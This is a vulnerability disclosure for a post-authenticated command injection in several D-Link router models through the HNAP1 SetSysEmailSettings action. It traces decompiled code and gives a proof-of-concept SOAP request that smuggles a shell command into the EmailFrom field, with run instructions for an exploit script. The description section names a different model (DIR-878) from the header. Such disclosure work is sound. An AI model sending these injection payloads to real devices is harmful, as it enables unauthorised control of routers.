# D-Link DIR-1960 : HNAP1 SetSysEmailSettings Post-Authenticated Command Injection

## Affected Software

Device : **D-Link DIR-1960, DIR-1360, DIR-2260 & DIR-3060**

Firmware: **1.11B03 Hotfix**

Endpoint: http://purenetworks.com/HNAP1/


## Description of the vulnerability
This vulnerability is present as there are no checks on user input taken from the SetSysEmailSettings action, which is passed to `twsystem`, allowing an attacker to execute arbitary code on the affected installations of the D-Link DIR-878 router.

## Technical Details

### HNAP1

D-Link uses the HNAP1 (Home Network Administration Protocol) which is a SOAP-based protocol. It can be accessed through the http://purenetworks.com/HNAP1/ with a SOAPAction HTTP header to specify the desired operation. **/bin/prog.cgi** is responsible for receiving the incoming requests, and saves the user-given parameters into nvram after processing them. On the other hand, **/bin/rc** reads from nvram then performs the operation that is requested by the user.

**/bin/rc** spawns a UDP server at port 6789, which is used by **/bin/prog.cgi** to notify it whenever there is request made by the user.


### Vulnerability

#### /bin/prog.cgi receives the request

In the **/bin/prog.cgi** binary, at the `SetSysEmailSettings` handler (0x4364e4), the parameters `EmailFrom` and `EmailTo` are read from the XML data in the request body, then passed into `MAIL_CheckEmail` to validate the input. After that, the parameters are saved into nvram.

```c
email_from = webGetVarString(request, "SetSysEmailSettings/EmailFrom");
check = MAIL_CheckEmail(email_from);
...
nvram_safe_set("SysLogMail_From", email_from);
```

```c
email_to = webGetVarString(request, "SetSysEmailSettings/EmailTo");
check = MAIL_CheckEmail(email_to);
...
nvram_safe_set("SysLogMail_To", email_to);
```

However, `MAIL_CheckEmail` only ensures that the characters `@` and `.` are present in the email string, and it does not check for bad characters that might result in command injection.

Finally, `serviceApply(1, 0x28);` is called, which notifies **/bin/rc** of a `start_email` operation.

```c
case 0x28:
    notify_rc("start_email");
    break;
```

#### /bin/rc handles the request

Inside `handle_notifications`, the `start_email` string leads to a call to `start_SendLog()`, which calls the vulnerable function at 0x4520bc.

```c
cmp = strcmp(notif_string_end, "email");
// mode == 2 when the notification starts with "start_"
if (cmp == 0) {
    if ((mode & 1) != 0) {
        FUN_00452078();
    }
    if ((mode & 2) != 0) {
        start_SendLog();
    }
}
```

```c
void start_SendLog(void)
{
  f_4520bc();
  return;
}
```

At 0x452b90 in the vulnerable function, the previously unchecked parameter `EmailFrom` is passed into `twsystem`, resulting in a command injection attack.

```c
auth_enable = nvram_get_int("SysLogMail_Auth_Enable");

if (auth_enable == 0) {
    emailFrom = nvram_safe_get("SysLogMail_From");
    smtServerAddress = nvram_safe_get("SysLogMail_SMTPServerAddress");
    smtpServerPort = nvram_safe_get("SysLogMail_SMTPServerPort");
    sprintf(cmd, "sendmail -f %s -H %s:%s -S -w %s -h %s < %s &", emailFrom,
            smtServerAddress, smtpServerPort, smtpTimeout, hostdomain, "/tmp/MailEnvelop");
}
else {
    auth_name = nvram_safe_get("SysLogMail_Auth_Name");
    auth_password = nvram_safe_get("SysLogMail_Auth_Password");
    TW_reversechar(auth_name2, auth_name, 0x100);
    TW_reversechar(auth_password2, auth_password, 0x100);
    emailFrom = nvram_safe_get("SysLogMail_From");
    smtServerAddress = nvram_safe_get("SysLogMail_SMTPServerAddress");
    smtpServerPort = nvram_safe_get("SysLogMail_SMTPServerPort");
    sprintf(cmd, "sendmail -f %s -H %s:%s@%s:%s -S -w %s -h %s < %s &", name,
            auth_name2, auth_password2, smtServerAddress, smtpServerPort, smtpTimeout, hostdomain,
            "/tmp/MailEnvelop");
}

twsystem(cmd, 1);
```

The code is vulnerable on both branches of the if-block.

## Exploit

After authenticating, send the following SOAP request to http://purenetworks.com/HNAP1/.

```xml
Content-Type: text/xml; charset=utf-8
SOAPAction: http://purenetworks.com/HNAP1/SetSysEmailSettings

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SetSysEmailSettings xmlns="http://purenetworks.com/HNAP1/">
            <SysEmail>true</SysEmail>
            <EmailFrom>from@gg.com$(echo gg>/tmp/gg)</EmailFrom>
            <EmailTo>to@gg.com</EmailTo>
            <SMTPServerAddress>127.0.0.1</SMTPServerAddress>
            <SMTPServerPort>587</SMTPServerPort>
            <Authentication>false</Authentication>
            <AccountName>name</AccountName>
            <AccountPassword>password</AccountPassword>
            <OnLogFull>true</OnLogFull>
            <OnSchedule>true</OnSchedule>
            <ScheduleName>schedule</ScheduleName>;
        </SetSysEmailSettings>
    </soap:Body>
</soap:Envelope>
```

### Usage

```
$ npm install
$ node app.js
```

Credits: https://github.com/bikerp/dsp-w215-hnap

## Timeline
20th July 2021 - First attempt to notify vendor

05th April 2022 - Second attempt to notify vendor

07th April 2022 - Third attempt to notify vendor

24th June 2022 - Fourth attempt to notify vendor

27th June 2022 - FundayFriday release